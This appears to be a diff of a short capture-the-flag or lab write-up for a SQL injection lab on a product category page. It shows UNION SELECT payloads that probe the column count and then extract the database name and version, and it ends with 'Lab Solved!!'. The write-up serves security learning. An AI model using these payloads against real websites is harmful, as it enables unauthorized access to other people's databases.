@@ -11,11 +11,11 @@
 - Goto => product category
 
 ```SQL 
--- Step-1 Try these to find the Number of Column
+-- Step-1 Try these to find the Number of Columns:
 'UNION SELECT NULL--+
 "UNION SELECT NULL,NULL--+
--- Step-2 After that Use 
-`'UNION SELECT database(),version()--+` 
+-- Step-2 After that, Use: 
+'UNION SELECT database(),version()--+` 
 ```
 
 - Lab Solved!!
